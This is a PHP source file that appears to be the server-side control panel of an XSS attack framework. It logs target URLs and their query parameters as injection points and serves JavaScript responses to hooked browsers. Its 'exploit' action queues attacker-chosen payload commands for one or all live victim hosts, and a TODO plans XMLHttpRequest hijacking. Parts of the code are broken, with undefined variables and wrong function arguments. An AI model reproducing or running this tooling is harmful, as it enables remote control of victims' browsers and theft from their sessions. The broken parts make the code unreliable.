<?php 
// TODO: get debug working
// TODO: finish xmlhttprequest hijack

require '../config.php';
$log = Logger::getLogger("app");

// ensure that browsers do not cache this call
header('Expires: Sat, 26 Jul 1997 05:00:00 GMT' );
header('Last-Modified: ' . gmdate( 'D, d M Y H:i:s' ) . ' GMT' );
header('Cache-Control: no-store, no-cache, must-revalidate' );
header('Cache-Control: post-check=0, pre-check=0', false );
header('Pragma: no-cache' );
header('Content-type: text/javascript');

function serve_response(array $data) {
	echo "var xssresp = " . json_encode($data) . ";";
	echo "server_response(xssresp);";
	exit;
}

function create_guid($value) {
	if (ctype_digit($value)) {
		$space = "0123456789";
		$l = 6;
	}
	else {
		$space = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		$l = 5;
	}
	$guid = "";
	for ($i=0;$i<$l;$i++) {
		$guid .= $space[mt_rand(0, count($space))];
	}
	return $guid;
}

try
{
	// TODO: use localcache so we don't need a DB connection unless writing
	// we will need a db connection
	$db = DB::getConnection(DB_HOST, DB_USER, DB_PASS, DB_NAME);


	/******************
	 * PRIVATE METHODS
	 *****************/
	if (!isset($_GET["A"]))
		die("no action");

	if ($_GET['auth'] != XSSPASSWORD) {
		$log->error("incorrect auth [ " . $_GET['auth'] . "]");
		die("require auth");
	}


	if ($_GET["A"] == "found_url") {
		$params = parse_url($_GET["url"]);
		$rows = $db->select("get_url", "SELECT * FROM url", array("domain" => $params['host'], "protocol" => $params['scheme'], "url" => $params['path']));
		if (!isset($rows[0])) {
			$id = $db->insert("add_url", "url", array("domain" => $params['host'], "protocol" => $params['scheme'], "url" => $params['path']));
		}
		else {
			$id = $rows[0]['id'];
		}


		$result = array();
		$parts = array();
		parse_str($params['query'], $parts);
		foreach ($parts as $key => $value) {
			$rows = $db->select("get_param", "SELECT * FROM param", array("urlid" => $rows, "name" => $key));
			if (!isset($rows[0])) {
				$guid = create_guid();
				$param_id = $db->insert("add_param", "param", array("url_id" => $id, "name" => $key, "guid" => $guid));
				$result[$part] = array("id" => $param_id, "url_id" => $id, "name" => $key, "guid" => $guid, "last_test" => "never");
			}
			else {
				$result[$part] = $rows[0];
			}
		}

		serve_response($result);
	}

	if ($_GET["A"] == "exploit") { 
		$command = "{$_GET['payload']}.php?".$_SERVER['QUERY_STRING'];
		if ($_GET['target'] == "ALL") {
			$rows = $db->select("get hosts", "SELECT *, 'active' as class FROM host", array("heartbeat > " => "!subtime(CURRENT_TIMESTAMP, '0:0:15')"));
			foreach ($rows as $row) {
				$db->insert("add command", "commands", array("guid" => $row['guid'], "command" => $command, "id" => null));
			}
		}
		else {
			$db->insert("add command", "commands", array("guid" => $_GET['target'], "command" => $command, "id" => null));
		}
	}
	if ($_GET["A"] == "debug") { 
		$rows = $db->select("get hosts", "SELECT id, log FROM debug_log", array("guid" => $_GET['guid']));
		$log = "<hr /><dl>";
		foreach ($rows as $r) {
			$log .= "<dt>".$r['id']."</dt>";
			$log .= "<dd>".$r['log']."</dt>";
			//$log .= str_replace("%A0", " / ", $r['log']) . "<br />";
		}
		$log .= "</dl>";

		echo "document.getElementById('out_debug').innerHTML = '$log'; xsscls(); ";
	}

	if ($_GET["A"] == "modules") {

		//$rows = $db->select("get hosts", "SELECT log FROM debug_log", array("guid" => $_GET['guid']));
		$modules = array();
		foreach (glob("modules/*.php") as $module) {
			$lines = file_get_contents($module);
			preg_match("/(\$\w+)/", $lines, $matches);
			$m = array();
		}
	}
	

} catch(Exception $e) {
	echo "<pre>";
	debug_print_backtrace();
	die ($e);
}

?>
